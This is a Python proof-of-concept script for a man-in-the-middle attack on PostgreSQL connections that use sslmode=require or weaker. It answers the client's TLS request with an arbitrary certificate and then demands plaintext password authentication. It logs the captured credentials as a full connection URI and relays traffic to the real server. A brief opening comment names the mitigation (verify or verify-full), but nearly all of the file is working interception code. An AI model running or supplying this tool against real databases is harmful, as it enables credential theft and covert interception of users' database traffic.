from __future__ import print_function

# This script demonstrates how to setup a Man-in-the-Middle (MitM) attack on a
# Postgres connection with SSLMODE=require or less. Attack is mitigated by
# setting SSLMODE=verify or SSLMODE=verify-full, which requires you to get the
# certificate of either your server or a CA that has signed it's certificate.

# What the script does:
# listen on socket for ssl startup messages
# reply with 'S' (supported?)
# Do TLS handshake with random cert/key
# Tell client to authenticate over plaintext to capture the password
# Initiate database connection to actual backend using the supplied password
# Proxy all traffic between the client and the actual database

# The backend database to proxy must be given as an argument on the command
# line for now, but in an actual attack you would read this from the redirect
# fields on the IP packets or similar, depending on how you're performing the
# attack.

# PS: Please don't look to this script for examples of how to write good socket
# code, this is just a quick proof of concept.

import argparse
import hashlib
import socket
import ssl
import select
import struct
import sys
import threading
import time
import logging
from collections import namedtuple

# Sent by client when requesting TLS connection (this is the magic version
# 1234.5679 of the protocol, defined in pgcomm.h)
SSL_STARTUP_RESPONSE = 'S'
VERSION_SSL = '\x04\xd2\x16\x2f'
VERSION_3   = '\x00\x03\x00\x00'

_logger = logging.getLogger(__name__)


# Lifted from pqcomm.h
AUTH_METHODS = {
    'AUTH_REQ_OK':          0,   # User is authenticated
    'AUTH_REQ_KRB4':        1,   # Kerberos V4. Not supported any more.
    'AUTH_REQ_KRB5':        2,   # Kerberos V5. Not supported any more.
    'AUTH_REQ_PASSWORD':    3,   # Password
    'AUTH_REQ_CRYPT':       4,   # crypt password. Not supported any more.
    'AUTH_REQ_MD5':         5,   # md5 password
    'AUTH_REQ_SCM_CREDS':   6,   # transfer SCM credentials
    'AUTH_REQ_GSS':         7,   # GSSAPI without wrap()
    'AUTH_REQ_GSS_CONT':    8,   # Continue GSS exchanges
    'AUTH_REQ_SSPI':        9,   # SSPI negotiate without wrap()
}

AUTH_METHODS_REVERSE = {val: key for key, val in AUTH_METHODS.items()}


def main():
    args = get_args()
    configure_logger(args.logging_level)
    target_backend = args.backend

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 5432))

    # max queued connections
    backlog = 5

    sock.listen(backlog)
    _logger.info('Listening for connections')

    # Maintain a reference to running threads to enable stopping them when the
    # script terminates
    threads = set()

    last_check_for_stopped_threads = time.time()

    try:
        while True:
            client_socket, address = sock.accept()
            client_handler = ClientConnection(client_socket, target_backend)
            client_handler.start()

            threads.add(client_handler)
            if time.time() - last_check_for_stopped_threads > 3:
                remove_stopped_threads(threads)

    except (KeyboardInterrupt, SystemExit):
        _logger.info('Received exit, shutting down sockets')
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
        stop_threads(threads)


def get_args():
    parser = argparse.ArgumentParser('postgres-mitm')
    parser.add_argument('backend')
    parser.add_argument('-l', '--logging-level',
        choices=('debug', 'info', 'warning'), default='info')
    return parser.parse_args()


def configure_logger(level):
    logging.basicConfig(format='%(asctime)-15s [%(levelname)s] %(message)s')
    _logger.setLevel(getattr(logging, level.upper()))


def remove_stopped_threads(threads):
    threads_to_remove = []
    for thread in threads:
        if thread.stopped:
            threads_to_remove.append(thread)
    for thread in threads_to_remove:
        threads.remove(thread)


def stop_threads(threads):
    for thread in threads:
        thread.stop()


class ClientConnection(threading.Thread):

    def __init__(self, client_socket, target_backend):
        super(ClientConnection, self).__init__()
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        self.ssl_context.load_cert_chain(certfile='server.cert', keyfile='server.key')
        self.socket = client_socket
        self.target_backend = target_backend
        self.server_socket = None
        self._stop = threading.Event()


    def stop(self):
        self._stop.set()


    @property
    def stopped(self):
        return self._stop.isSet()


    def run(self):
        try:
            self.initiate_client_and_server_connections()
            _logger.debug('Initiated')
            while not self.stopped:
                timeout = 0
                sockets = [self.server_socket, self.socket]
                sockets_with_data = select.select(sockets, [], [], timeout)[0]
                if self.socket in sockets_with_data:
                    data = self.socket.read()
                    _logger.debug('Client -> Server: %s' % repr(data))
                    if data:
                        self.server_socket.send(data)
                    else:
                        self.socket.close()
                        self.server_socket.shutdown(socket.SHUT_RDWR)
                        self.server_socket.close()
                        break
                if self.server_socket in sockets_with_data:
                    data = self.server_socket.read()
                    _logger.debug('Server -> Client: %s' % repr(data))
                    if data:
                        self.socket.send(data)
                    else:
                        self.socket.shutdown(socket.SHUT_RDWR)
                        self.socket.close()
                        self.server_socket.shutdown(socket.SHUT_RDWR)
                        self.server_socket.close()
        finally:
            self.terminate()


    def initiate_client_and_server_connections(self):
        # wait for startup packet
        first_client_packet = self.wait_for_client_ssl_or_startup_packet()
        requested_protocol_version = first_client_packet[4:8]

        if requested_protocol_version == VERSION_SSL:
            _logger.debug('Got SSL startup request')
            self.send_to_client(SSL_STARTUP_RESPONSE)
            self.listen_for_tls_handshake()
            startup_packet = self.wait_for_client_ssl_or_startup_packet()
            self.handle_startup_packet(startup_packet)
        elif requested_protocol_version == VERSION_3:
            # Didn't request SSL, totally fine for us, just request plaintext
            # auth and grab the credentials
            _logger.debug('Initiating plaintext connection')
            self.handle_startup_packet(first_client_packet)
        else:
            # Invalid first packet, abort the connection
            self.terminate()
            return

        auth_request = self.wait_for_auth_request()
        if not self.handle_authentication_request(auth_request):
            raise Exception('Backend auth failed')


    def wait_for_client_ssl_or_startup_packet(self):
        # Either SSL request or startup is the first packet sent, both has the
        # format <int32 length><int32 protocol>[<other>]

        # Read first 8 bytes to get tag and length of packet
        first_8_bytes = self.read_n_bytes_from_client(8)

        # Startup messages and SSL requests start with length of message in
        # the first four bytes
        msg_length = struct.unpack('!I', first_8_bytes[:4])[0]

        rest_of_message = self.read_n_bytes_from_client(msg_length - 8)

        return first_8_bytes + rest_of_message


    def wait_for_auth_request(self):
        # Format of message is <char tag><int32 len><message>
        first_5_bytes = self.read_n_bytes_from_client(5)
        tag = first_5_bytes[0]
        if tag != 'p':
            raise Exception("Received non-auth request: %s" % tag)

        # Bump length with 1 to offset for tag
        msg_length = struct.unpack('!I', first_5_bytes[1:])[0] + 1
        _logger.debug('Reading auth request, waiting for %d bytes' % msg_length)

        rest_of_message = self.read_n_bytes_from_client(msg_length - 5)
        return first_5_bytes + rest_of_message


    def read_n_bytes_from_client(self, n):
        return read_n_bytes_from_socket(self.socket, n)




    def send_to_client(self, msg):
        bytes_sent = 0
        while bytes_sent < len(msg):
            sent = self.socket.send(msg[bytes_sent:])
            if sent == 0:
                raise Exception('Client socket closed')
            bytes_sent += sent


    def handle_startup_packet(self, data):
        self.startup_packet = data
        self.options = parse_options_from_startup_packet(data)
        _logger.debug('Startup packet processed successfully: %s' % self.options)
        auth_reply = 'R%(length)s%(method)s' % {
            'length': struct.pack('!I', 8),
            'method': struct.pack('!I', AUTH_METHODS['AUTH_REQ_PASSWORD']),
        }
        _logger.debug('Replying to startup: %s' % repr(auth_reply))
        self.socket.send(auth_reply)
        return True


    def handle_authentication_request(self, data):
        _logger.debug('Got auth request packet: %s' % repr(data))

        password = parse_password_from_authentication_packet(data)
        if self.connect_to_actual_backend(password):
            captured_uri = 'postgres://%(user)s:%(password)s@%(host)s:5432/%(database)s' % {
                'user': self.options.get('user', ''),
                'password': password,
                'host': self.target_backend,
                'database': self.options.get('database', ''),
            }
            auth_success = 'R%(length)s%(status)s' % {
                'length': struct.pack('!I', 8),
                'status': struct.pack('!I', AUTH_METHODS['AUTH_REQ_OK']),
            }
            _logger.info('Success! Intercepted auth: %s' % captured_uri)
            self.socket.send(auth_success)
            # Switch socket to non-blocking to enable messages to pass in
            # arbitrary order
            self.socket.setblocking(0)
        else:
            return False
        return True


    def connect_to_actual_backend(self, password):
        sock = socket.create_connection((self.target_backend, 5432))
        sock.send('%(length)s%(version)s' % {
            'length': struct.pack('!I', 8),
            'version': VERSION_SSL,
        })
        buffer_size = 1024
        data = sock.recv(buffer_size)
        assert data == 'S'
        sock = self.ssl_context.wrap_socket(sock)
        sock.do_handshake()
        sock.send(self.startup_packet)
        data = sock.recv()
        _logger.debug('Got reply to startup: %s' % repr(data))
        auth_request = parse_auth_request_packet(data)
        if auth_request.method == 'AUTH_REQ_MD5':
            # options is 4-byte salt
            salt = auth_request.options
            response = create_md5_auth_packet(self.options.get('user', ''), password, salt)
            sock.send(response)
        else:
            _logger.debug('Unsupported backend auth method: %s' % auth_request.method)
            return False

        self.server_socket = sock

        # Receive auth response and forward to client
        data = self.server_socket.recv()
        self.socket.send(data)

        # Make socket non-blocking
        self.server_socket.setblocking(0)

        return True


    def listen_for_tls_handshake(self):
        self.socket = self.ssl_context.wrap_socket(self.socket, server_side=True)


    def terminate(self):
        _logger.debug('Terminating thread')
        for sock in (self.socket, self.server_socket):
            if not sock:
                continue
            try:
                if not socket_is_closed(self.socket):
                    self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
            except:
                _logger.exception('Got exception when trying to close socket')
        self.stop()


def socket_is_closed(sock):
    return isinstance(sock._sock, socket._closedsocket)


def read_n_bytes_from_socket(sock, n):
    buf = bytearray(n)
    view = memoryview(buf)
    while n:
        nbytes = sock.recv_into(view, n)
        view = view[nbytes:] # slicing views is cheap
        n -= nbytes
    return str(buf)


def create_md5_auth_packet(username, password, salt):
    pw_and_username = password + username
    pw_hash = hashlib.md5(pw_and_username).hexdigest()
    salted_hash = 'md5' + hashlib.md5(pw_hash + salt).hexdigest()
    response = 'p%(length)s%(salted_hash)s\0' % {
        # 32 bytes of digest, four bytes length, 3 bytes for 'md5', one byte terminating null
        'length': struct.pack('!I', 40),
        'salted_hash': salted_hash,
    }
    return response


def parse_options_from_startup_packet(data):
    # format is <in32 length><in32 protocol>[<key>\0<value>\0]+\0
    raw_key_value_pairs = data[8:]
    assert raw_key_value_pairs[-1] == '\0'
    raw_key_value_pairs = raw_key_value_pairs[0:-1]
    assert raw_key_value_pairs.count('\0') % 2 == 0

    options = {}
    key_value_pairs = data[8:].split('\0')
    for i in range(0, len(key_value_pairs), 2):
        key = key_value_pairs[i]
        value = key_value_pairs[i + 1]
        options[key] = value

    return options


def parse_password_from_authentication_packet(data):
    assert data[-1] == '\0'
    return data[5:-1]


def parse_auth_request_packet(data):
    # format is R<int32 length><int32 method>[<options>]
    assert len(data) >= 9
    assert data[0] == 'R'
    raw_length = data[1:5]
    length = struct.unpack('!I', raw_length)[0] # TODO: Unused
    raw_method = data[5:9]
    method = struct.unpack('!I', raw_method)[0]
    assert method in AUTH_METHODS_REVERSE
    textual_method = AUTH_METHODS_REVERSE[method]
    AuthRequest = namedtuple('AuthRequest', 'method options')
    return AuthRequest(textual_method, data[9:])


if __name__ == '__main__':
    main()
